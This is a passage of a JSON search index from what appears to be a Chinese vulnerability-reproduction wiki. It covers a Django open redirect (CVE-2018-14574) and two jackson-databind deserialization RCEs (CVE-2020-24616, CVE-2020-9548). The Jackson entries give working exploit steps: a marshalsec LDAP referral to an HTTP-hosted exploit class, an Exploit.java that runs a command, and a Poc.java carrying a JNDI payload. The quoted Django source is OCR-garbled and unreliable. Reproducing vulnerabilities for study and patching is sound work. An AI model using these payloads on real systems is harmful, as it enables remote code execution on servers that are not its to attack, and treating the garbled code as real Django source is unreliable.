\u56de\u5230\u6570\u636e\u5e93\u4e2d\uff0c\u53d1\u73b0\u5b58\u5728\u5185\u5bb9\u4e86\uff0c\u6210\u529f","title":"\u73af\u5883\u642d\u5efa"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89%E5%A4%8D%E7%8E%B0/#_4","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/","text":"Django\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e \u00b6 \u5728Django\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u7528\u6237\u8bbf\u95ee\u7684URL\u7684\u6700\u540e\u4e00\u4f4d\u5e94\u8be5\u662f\u4ee5\u659c\u6760\u7ed3\u5c3e\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165\u7684URL\u6ca1\u52a0\u659c\u6760\uff0c\u90a3\u4e48\u4f1a\u9ed8\u8ba4\u81ea\u52a8\u5e2e\u4f60\u8865\u4e0a\u5b83\u5e76\u8df3\u8f6c\u5230\u5e26\u659c\u6760\u7684\u8bf7\u6c42\u4e2d\u3002\u5728path\u5f00\u5934\u4e3a//example.com\u7684\u60c5\u51b5\u4e0b\uff0cDjango\u6ca1\u505a\u5904\u7406\uff0c\u5bfc\u81f4\u6d4f\u89c8\u5668\u8ba4\u4e3a\u76ee\u7684\u5730\u5740\u662f\u7edd\u5bf9\u8def\u5f84\uff0c\u6700\u7ec8\u9020\u6210\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u662f\u76ee\u6807URLCONF\u4e2d\u5b58\u5728\u80fd\u5339\u914d\u4e0a//example.com\u7684\u89c4\u5219\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 \u5f71\u54cd\u7248\u672c\uff1a version < 2.0.8 \u6f0f\u6d1e\u539f\u56e0\uff1aDjango\u5b89\u88c5\u597d\u540e\uff0c\u5f53settings\u6a21\u5757\u914d\u7f6e\u597d\u4e86django.middleware.common.CommonMiddleware\uff0c\u4e14APPEND_SLASH\u4e3aTrue\u65f6\u6f0f\u6d1e\u5c31\u4f1a\u89e6\u53d1\uff08\u8fd9\u4e24\u4e2a\u914d\u7f6e\u662f\u9ed8\u8ba4\u5b58\u5728\u7684\uff09\u3002 CommonMiddleware\u5176\u5b9e\u662fDjango\u4e2d\u7684\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u56e0\u4e3aDjango\u662f\u7528python\u5199\u7684\uff0c\u6240\u4ee5\u53c8\u53ef\u4ee5\u8bf4\u5b83\u662f\u4e00\u4e2a\u4f4d\u4e8esite-packages/django/middleware/common.py\u7684\u4e00\u4e2a\u7c7b\u3002Django\u5728\u63a5\u53d7\u5230\u4e00\u4e2a\u8bf7\u6c42\uff08request\uff09\u540e\uff0c\u4f1a\u5148\u653e\u5230\u4e2d\u95f4\u4ef6\uff08CommonMiddleware\uff09\u4e2d\u53bb\u5904\u7406\uff0c\u7136\u540e\u518d\u901a\u8fc7\u9ed8\u8ba4\u7684 URL \u65b9\u5f0f\u8fdb\u884c\u3002\u5982\u679c\u8bbe\u7f6e\u4e86APPEND_SLASH=True\uff0c\u5e76\u4e14\u7528\u6237\u8f93\u5165\u7684URL\u6ca1\u6709\u4ee5\u659c\u6760\u7ed3\u5c3e\uff0c\u5728urlpatterns\u4e2d\u4e5f\u5339\u914d\u4e0d\u5230\u8fd9\u4e2aURL\uff0c\u5219\u901a\u8fc7\u5728\u672b\u5c3e\u9644\u52a0\u659c\u6760\u6765\u5f62\u6210\u65b0\u7684URL\u3002\u5982\u679c\u5728urlpatterns\u4e2d\u627e\u5230\u6b64\u65b0URL\uff0c\u5219\u5c06HTTP\u91cd\u5b9a\u5411\u8fd4\u56de\u5230\u6b64\u65b0URL\u3002\u4f8b\u5982\uff1a \u521d\u59cb\u94fe\u63a5 \uff1a http : // your - ip : 8000 / test 301 \u91cd\u5b9a\u5411\u540e\u7684\u94fe\u63a5 \uff1a http : // your - ip : 8000 / test / 12 \u4f46\u662f\u5982\u679cURL\u662f\u8fd9\u6837\u7684\uff1a http://your-ip:8000//example.com \uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u8fdb\u5165site-packages/django/middleware/common.py\u4e0b\u6267\u884cprocess_request()\u51fd\u6570\uff1a def process_ request ( self , request ): \"\"\" Check for denied User-Agents and rewrite the URL based on settings. APPEND_ SLASH and settings. PREPEND_ WWW \"\"\" # Check for denied User-Agents if 'HTTP_ USER_ AGENT' in request . META : for user_ agent_ regex in settings . DISALLOWED _USER_ AGENTS : if user_ agent_ regex . search ( request . META [ 'HTTP_ USER_ AGENT' ]): raise Permi ssionDenied ( ' Forbidden user agent ' ) # Check for a redirect based on settings.PREPEND WWW host = request . get host () must_ prepend = settings . PREPEND _WWW and host and not host . startswith ( ' www.' ) redirect_ url = ( ' %s :/ /WWw. %s ' % ( request . scheme , host )) if must_ prepend else '' # Check if a slash should be appended if self . should_ redirect_with_slash ( request ): path = self . get_fu11_path_with_slash ( request ) else : path = request . get _fu11_ _path () # Return a redirect if necessary if redirect_ _url or path != request . get_ full_ path (): redirect_ url += path return self . response_ redirect_ class ( redirect_ url ) 1234567891011121314151617181920212223 \u53ef\u4ee5\u770b\u5230\uff0c\u4e0a\u9762\u7684\u7a0b\u5e8f\u4f1a\u8fdb\u5165get_full_path_with_slash()\u51fd\u6570\uff1a # Check if a slash should be appended if self . should_ redirect_with_slash ( request ): path = self . get_fu11_path_with_slash ( request ) 123 \u5206\u6790\u4e00\u4e0bget_full_path_with_slash()\u51fd\u6570\uff1a def get_full_path_with_slash ( self , request ): Return the full path of the request with a trailing sLash appended . Raise a RuntimeError if settings . DEBUG is True and request . method is POST , PUT , or PATCH . new path = request . get_full_path ( force_append_slash = True ) if settings . DEBUG and request . method in ( 'POST' , 'PUT' , 'PATCH' ): raise RuntimeError \"You called this URL via %( method)s, but the URL doesn't end \"in a slash and you have APPEND_ SLASH set. Django can't' \"redirect to the slash URL while maintaining %( method)s data . \"Change your form to point to %(url)s (note the trailing \u201d \"slash), or set APPEND_SLASH = False in your Django settings . \" % { method ' : request . method\uff0c url ': request.get_host() + new_ path, } return new_ path 1234567891011121314151617 \u5176\u5b9e\u4f5c\u7528\u5c31\u662f\u7ed9path\u672b\u5c3e\u52a0\u4e0a\u659c\u6760\uff0c\u4e5f\u5c31\u662f\u8fd4\u56de\u4e00\u4e2a//example.com/ \u63a5\u7740\u8fdb\u5165response_redirect_class\u51fd\u6570,\u5b83\u662fHTTP\u8df3\u8f6c\u7684\u4e00\u4e2a\u57fa\u7c7b\uff1a # Return a redirect if necessary if redirect_ url or path != request . get_ ful1_ path (): redirect_ _url += path return self . response redirect_ class ( redirect_ ur 1 ) 1234 \u4ee5//\u5f00\u5934\u7684\u5916\u90e8URL\u5c06\u7531\u6d4f\u89c8\u5668\u7ffb\u8bd1\u4e3a\u534f\u8bae\u3001\u7edd\u5bf9URL \u518d\u5f80\u540e\u6709\u5bf9\u534f\u8bae\u7684\u68c0\u67e5\uff0c\u4f46\u662fscheme\u6839\u672c\u5c31\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u4f1a\u8df3\u8fc7\u8fd9\u4e2a\u5224\u65ad\uff1a class HttpResponseRedirectBase ( HttpResponse ): allowed_ schemes = [ 'http' , 'https' , 'ftp' ] def init__ ( self , redirect to , * args , ** kwargs ): super ( ) . _ init_ ( * args , ** kwargs ) self [ 'Location' ] = iri_ to_ uri ( redirect_ tq ) parsed = urlparse ( str ( redirect_ to )) if parsed . scheme and parsed . scheme not in self . allowed_ schemes : raise DisallowedRedirect ( \"Unsafe redirect to URL with protocol ' %s '\" % parsed . scheme ) url = property ( lambda self : self [ 'Location' ]) def_ repr_ ( self ): return '< %(c1s)s status_ code=%( status_ code )d%( content_ type)s, ur1=\" %(ur1)s \">' % { cls ': self._ class__ ._ name___ , status_ code ' : self. status_ code , content_ type ': self.. content_ type_ for repr, url ' : self .ur1, } 12345678910111213141516 \u63a5\u7740\u53ef\u4ee5\u770b\u5230\u6b63\u5e38\u7684301\u8df3\u8f6c \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fdb\u5165\u73af\u5883 301\u91cd\u5b9a\u5411\u540e\u5c3e\u5df4\u52a0\u4e86\u659c\u6760 \u6dfb\u52a0// www.baidu.com\u540e\u5b9e\u73b0\u4e86\u9875\u9762\u7684\u8df3\u8f6c \u6210\u529f\u8df3\u8f6c","title":"Django\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e\uff08CVE 2018 14574)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/#djangourl","text":"\u5728Django\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u7528\u6237\u8bbf\u95ee\u7684URL\u7684\u6700\u540e\u4e00\u4f4d\u5e94\u8be5\u662f\u4ee5\u659c\u6760\u7ed3\u5c3e\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165\u7684URL\u6ca1\u52a0\u659c\u6760\uff0c\u90a3\u4e48\u4f1a\u9ed8\u8ba4\u81ea\u52a8\u5e2e\u4f60\u8865\u4e0a\u5b83\u5e76\u8df3\u8f6c\u5230\u5e26\u659c\u6760\u7684\u8bf7\u6c42\u4e2d\u3002\u5728path\u5f00\u5934\u4e3a//example.com\u7684\u60c5\u51b5\u4e0b\uff0cDjango\u6ca1\u505a\u5904\u7406\uff0c\u5bfc\u81f4\u6d4f\u89c8\u5668\u8ba4\u4e3a\u76ee\u7684\u5730\u5740\u662f\u7edd\u5bf9\u8def\u5f84\uff0c\u6700\u7ec8\u9020\u6210\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u662f\u76ee\u6807URLCONF\u4e2d\u5b58\u5728\u80fd\u5339\u914d\u4e0a//example.com\u7684\u89c4\u5219\u3002","title":"Django\u4efb\u610fURL\u8df3\u8f6c\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/#_1","text":"\u5f71\u54cd\u7248\u672c\uff1a version < 2.0.8 \u6f0f\u6d1e\u539f\u56e0\uff1aDjango\u5b89\u88c5\u597d\u540e\uff0c\u5f53settings\u6a21\u5757\u914d\u7f6e\u597d\u4e86django.middleware.common.CommonMiddleware\uff0c\u4e14APPEND_SLASH\u4e3aTrue\u65f6\u6f0f\u6d1e\u5c31\u4f1a\u89e6\u53d1\uff08\u8fd9\u4e24\u4e2a\u914d\u7f6e\u662f\u9ed8\u8ba4\u5b58\u5728\u7684\uff09\u3002 CommonMiddleware\u5176\u5b9e\u662fDjango\u4e2d\u7684\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u56e0\u4e3aDjango\u662f\u7528python\u5199\u7684\uff0c\u6240\u4ee5\u53c8\u53ef\u4ee5\u8bf4\u5b83\u662f\u4e00\u4e2a\u4f4d\u4e8esite-packages/django/middleware/common.py\u7684\u4e00\u4e2a\u7c7b\u3002Django\u5728\u63a5\u53d7\u5230\u4e00\u4e2a\u8bf7\u6c42\uff08request\uff09\u540e\uff0c\u4f1a\u5148\u653e\u5230\u4e2d\u95f4\u4ef6\uff08CommonMiddleware\uff09\u4e2d\u53bb\u5904\u7406\uff0c\u7136\u540e\u518d\u901a\u8fc7\u9ed8\u8ba4\u7684 URL \u65b9\u5f0f\u8fdb\u884c\u3002\u5982\u679c\u8bbe\u7f6e\u4e86APPEND_SLASH=True\uff0c\u5e76\u4e14\u7528\u6237\u8f93\u5165\u7684URL\u6ca1\u6709\u4ee5\u659c\u6760\u7ed3\u5c3e\uff0c\u5728urlpatterns\u4e2d\u4e5f\u5339\u914d\u4e0d\u5230\u8fd9\u4e2aURL\uff0c\u5219\u901a\u8fc7\u5728\u672b\u5c3e\u9644\u52a0\u659c\u6760\u6765\u5f62\u6210\u65b0\u7684URL\u3002\u5982\u679c\u5728urlpatterns\u4e2d\u627e\u5230\u6b64\u65b0URL\uff0c\u5219\u5c06HTTP\u91cd\u5b9a\u5411\u8fd4\u56de\u5230\u6b64\u65b0URL\u3002\u4f8b\u5982\uff1a \u521d\u59cb\u94fe\u63a5 \uff1a http : // your - ip : 8000 / test 301 \u91cd\u5b9a\u5411\u540e\u7684\u94fe\u63a5 \uff1a http : // your - ip : 8000 / test / 12 \u4f46\u662f\u5982\u679cURL\u662f\u8fd9\u6837\u7684\uff1a http://your-ip:8000//example.com \uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u8fdb\u5165site-packages/django/middleware/common.py\u4e0b\u6267\u884cprocess_request()\u51fd\u6570\uff1a def process_ request ( self , request ): \"\"\" Check for denied User-Agents and rewrite the URL based on settings. APPEND_ SLASH and settings. PREPEND_ WWW \"\"\" # Check for denied User-Agents if 'HTTP_ USER_ AGENT' in request . META : for user_ agent_ regex in settings . DISALLOWED _USER_ AGENTS : if user_ agent_ regex . search ( request . META [ 'HTTP_ USER_ AGENT' ]): raise Permi ssionDenied ( ' Forbidden user agent ' ) # Check for a redirect based on settings.PREPEND WWW host = request . get host () must_ prepend = settings . PREPEND _WWW and host and not host . startswith ( ' www.' ) redirect_ url = ( ' %s :/ /WWw. %s ' % ( request . scheme , host )) if must_ prepend else '' # Check if a slash should be appended if self . should_ redirect_with_slash ( request ): path = self . get_fu11_path_with_slash ( request ) else : path = request . get _fu11_ _path () # Return a redirect if necessary if redirect_ _url or path != request . get_ full_ path (): redirect_ url += path return self . response_ redirect_ class ( redirect_ url ) 1234567891011121314151617181920212223 \u53ef\u4ee5\u770b\u5230\uff0c\u4e0a\u9762\u7684\u7a0b\u5e8f\u4f1a\u8fdb\u5165get_full_path_with_slash()\u51fd\u6570\uff1a # Check if a slash should be appended if self . should_ redirect_with_slash ( request ): path = self . get_fu11_path_with_slash ( request ) 123 \u5206\u6790\u4e00\u4e0bget_full_path_with_slash()\u51fd\u6570\uff1a def get_full_path_with_slash ( self , request ): Return the full path of the request with a trailing sLash appended . Raise a RuntimeError if settings . DEBUG is True and request . method is POST , PUT , or PATCH . new path = request . get_full_path ( force_append_slash = True ) if settings . DEBUG and request . method in ( 'POST' , 'PUT' , 'PATCH' ): raise RuntimeError \"You called this URL via %( method)s, but the URL doesn't end \"in a slash and you have APPEND_ SLASH set. Django can't' \"redirect to the slash URL while maintaining %( method)s data . \"Change your form to point to %(url)s (note the trailing \u201d \"slash), or set APPEND_SLASH = False in your Django settings . \" % { method ' : request . method\uff0c url ': request.get_host() + new_ path, } return new_ path 1234567891011121314151617 \u5176\u5b9e\u4f5c\u7528\u5c31\u662f\u7ed9path\u672b\u5c3e\u52a0\u4e0a\u659c\u6760\uff0c\u4e5f\u5c31\u662f\u8fd4\u56de\u4e00\u4e2a//example.com/ \u63a5\u7740\u8fdb\u5165response_redirect_class\u51fd\u6570,\u5b83\u662fHTTP\u8df3\u8f6c\u7684\u4e00\u4e2a\u57fa\u7c7b\uff1a # Return a redirect if necessary if redirect_ url or path != request . get_ ful1_ path (): redirect_ _url += path return self . response redirect_ class ( redirect_ ur 1 ) 1234 \u4ee5//\u5f00\u5934\u7684\u5916\u90e8URL\u5c06\u7531\u6d4f\u89c8\u5668\u7ffb\u8bd1\u4e3a\u534f\u8bae\u3001\u7edd\u5bf9URL \u518d\u5f80\u540e\u6709\u5bf9\u534f\u8bae\u7684\u68c0\u67e5\uff0c\u4f46\u662fscheme\u6839\u672c\u5c31\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u4f1a\u8df3\u8fc7\u8fd9\u4e2a\u5224\u65ad\uff1a class HttpResponseRedirectBase ( HttpResponse ): allowed_ schemes = [ 'http' , 'https' , 'ftp' ] def init__ ( self , redirect to , * args , ** kwargs ): super ( ) . _ init_ ( * args , ** kwargs ) self [ 'Location' ] = iri_ to_ uri ( redirect_ tq ) parsed = urlparse ( str ( redirect_ to )) if parsed . scheme and parsed . scheme not in self . allowed_ schemes : raise DisallowedRedirect ( \"Unsafe redirect to URL with protocol ' %s '\" % parsed . scheme ) url = property ( lambda self : self [ 'Location' ]) def_ repr_ ( self ): return '< %(c1s)s status_ code=%( status_ code )d%( content_ type)s, ur1=\" %(ur1)s \">' % { cls ': self._ class__ ._ name___ , status_ code ' : self. status_ code , content_ type ': self.. content_ type_ for repr, url ' : self .ur1, } 12345678910111213141516 \u63a5\u7740\u53ef\u4ee5\u770b\u5230\u6b63\u5e38\u7684301\u8df3\u8f6c","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/Django%E4%BB%BB%E6%84%8FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-14574%29/#_2","text":"\u8fdb\u5165\u73af\u5883 301\u91cd\u5b9a\u5411\u540e\u5c3e\u5df4\u52a0\u4e86\u659c\u6760 \u6dfb\u52a0// www.baidu.com\u540e\u5b9e\u73b0\u4e86\u9875\u9762\u7684\u8df3\u8f6c \u6210\u529f\u8df3\u8f6c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 FasterXML Jackson\u53d1\u5e03\u4e86\u65b0\u7684\u9ad8\u5371\u6f0f\u6d1e\uff08\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-24616\uff09\uff0c\u5176\u5b98\u65b9\u56e2\u961f\u53d1\u5e03\u4e86 jackson-databind \u7684\u65b0\u7248\u672c 2.9.10.6\uff0c\u5176\u4e2d\u4fee\u590d\u4e86\u51e0\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 FasterXML Jackson\u662f\u7f8e\u56fdFasterXML\u516c\u53f8\u7684\u4e00\u6b3e\u9002\u7528\u4e8eJava\u7684\u6570\u636e\u5904\u7406\u5de5\u5177\u3002jackson-databind\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u5177\u6709\u6570\u636e\u7ed1\u5b9a\u529f\u80fd\u7684\u7ec4\u4ef6\u3002 FasterXML jackson-databind 2.9.10.6\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u8f7d\u8377\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u7cfb\u7edf\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \u00b6 jackson-databind < 2.9.10.6 \u5b89\u5168\u7248\u672c \u00b6 jackson-databind 2.9.10.6 jackson-databind 2.10 \u6f0f\u6d1e\u4fee\u590d \u00b6 1.\u5efa\u8bae\u7528\u6237\u5c06jackson-databind\u7ec4\u4ef6\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c\u3002 https://github.com/FasterXML/jackson-databind/releases 2.\u5728Jackson 2.10 \u4e2d\u5f15\u5165\u4e86Safe Default Typing\u767d\u540d\u5355\u673a\u5236\uff0c\u53ef\u675c\u7edd\u6b64\u7c7bgadget\u7684\u5f71\u54cd\u3002 POC \u00b6 \u628a\u7f16\u8bd1\u597d\u7684exploit.class\u653e\u7f6e\u5728\u670d\u52a1\u7aef \u5f00\u542fHTTP\u670d\u52a1 python3 -m http.server 8888 \u6216\u8005tomcat\u90fd\u884c \u542f\u52a8LDAP``` java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u201c http://x.x.x.x(\u670d\u52a1\u7aefIp):8888/#Exploit \u201d 9999 PS:poc\u4e2d\u7684\u7aef\u53e3\u53f7\u8981\u548cLDAP\u7684\u5bf9\u5e94 \u672c\u5730\u8fd0\u884cjavaPOC cve-2020-24616-poc-master","title":"Jackson\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2020-24616"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_1","text":"FasterXML Jackson\u53d1\u5e03\u4e86\u65b0\u7684\u9ad8\u5371\u6f0f\u6d1e\uff08\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-24616\uff09\uff0c\u5176\u5b98\u65b9\u56e2\u961f\u53d1\u5e03\u4e86 jackson-databind \u7684\u65b0\u7248\u672c 2.9.10.6\uff0c\u5176\u4e2d\u4fee\u590d\u4e86\u51e0\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 FasterXML Jackson\u662f\u7f8e\u56fdFasterXML\u516c\u53f8\u7684\u4e00\u6b3e\u9002\u7528\u4e8eJava\u7684\u6570\u636e\u5904\u7406\u5de5\u5177\u3002jackson-databind\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u5177\u6709\u6570\u636e\u7ed1\u5b9a\u529f\u80fd\u7684\u7ec4\u4ef6\u3002 FasterXML jackson-databind 2.9.10.6\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u8f7d\u8377\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u7cfb\u7edf\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_2","text":"jackson-databind < 2.9.10.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_3","text":"jackson-databind 2.9.10.6 jackson-databind 2.10","title":"\u5b89\u5168\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_4","text":"1.\u5efa\u8bae\u7528\u6237\u5c06jackson-databind\u7ec4\u4ef6\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c\u3002 https://github.com/FasterXML/jackson-databind/releases 2.\u5728Jackson 2.10 \u4e2d\u5f15\u5165\u4e86Safe Default Typing\u767d\u540d\u5355\u673a\u5236\uff0c\u53ef\u675c\u7edd\u6b64\u7c7bgadget\u7684\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u4fee\u590d"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#poc","text":"\u628a\u7f16\u8bd1\u597d\u7684exploit.class\u653e\u7f6e\u5728\u670d\u52a1\u7aef \u5f00\u542fHTTP\u670d\u52a1 python3 -m http.server 8888 \u6216\u8005tomcat\u90fd\u884c \u542f\u52a8LDAP``` java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u201c http://x.x.x.x(\u670d\u52a1\u7aefIp):8888/#Exploit \u201d 9999 PS:poc\u4e2d\u7684\u7aef\u53e3\u53f7\u8981\u548cLDAP\u7684\u5bf9\u5e94 \u672c\u5730\u8fd0\u884cjavaPOC cve-2020-24616-poc-master","title":"POC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Jackson/jackson-databind-rce-cve-2020-9548/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u2022 jackson-databind before 2.9.10.4 \u2022 jackson-databind before 2.8.11.6 \u2022 jackson-databind before 2.7.9.7 \u6f0f\u6d1e\u7c7b\u578b \u00b6 JDNI\u6ce8\u5165\u5bfc\u81f4RCE \u5229\u7528\u6761\u4ef6 \u2022 \u5f00\u542fenableDefaultTyping() \u2022 \u4f7f\u7528\u4e86br.com.anteros.dbcp.AnterosDBCPConfig\u7b2c\u4e09\u65b9\u4f9d\u8d56 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 2020\u5e743\u6708\uff0cjackson-databind\u5728github\u4e0a\u66f4\u65b0\u4e86\u4e00\u4e2a\u65b0\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7c7bbr.com.anteros.dbcp.AnterosDBCPConfig\uff0c\u8be5\u7c7b\u7ed5\u8fc7\u4e86\u4e4b\u524djackson-databind\u7ef4\u62a4\u7684\u9ed1\u540d\u5355\u7c7b\uff0c\u5e76\u4e14JDK\u7248\u672c\u8f83\u4f4e\u7684\u8bdd\uff0c\u53ef\u9020\u6210RCE\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u73af\u5883\u642d\u5efa pom.xml\uff1a <dependencies> <dependency> <groupId>com.fasterxml.jackson.core</groupId> <artifactId>jackson-databind</artifactId> <version>2.9.9.1</version> </dependency> <!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --> <dependency> <groupId>br.com.anteros</groupId> <artifactId>Anteros-DBCP</artifactId> <version>1.0.1</version> </dependency> <dependency> <groupId>org.slf4j</groupId> <artifactId>slf4j-nop</artifactId> <version>1.7.2</version> </dependency> <!-- https://mvnrepository.com/artifact/javax.transaction/jta --> <dependency> <groupId>javax.transaction</groupId> <artifactId>jta</artifactId> <version>1.1</version> </dependency> </dependencies> \u6f0f\u6d1e\u5229\u7528 \u00b6 \u7f16\u8bd1Exploit.java Exploit.java\u4ee3\u7801\u5982\u4e0b\uff1a import java.lang.Runtime; public class Exploit { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (Exception e) { e.printStackTrace(); } } } \u642d\u5efaHTTP\u670d\u52a1 \u4f7f\u7528Python\u642d\u5efa\u7b80\u6613SimpleHTTPServer\u670d\u52a1\uff1a \u642d\u5efaLDAP\u670d\u52a1 \u4f7f\u7528marshalsec\u6765\u542f\u52a8\u4e00\u4e2aLDAP\u670d\u52a1\uff1a \u6267\u884c\u6f0f\u6d1ePOC1 Poc.java\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } } } \u4e4b\u540e\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u6267\u884c\u547d\u4ee4\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a \u6f0f\u6d1e\u5206\u6790 \u00b6 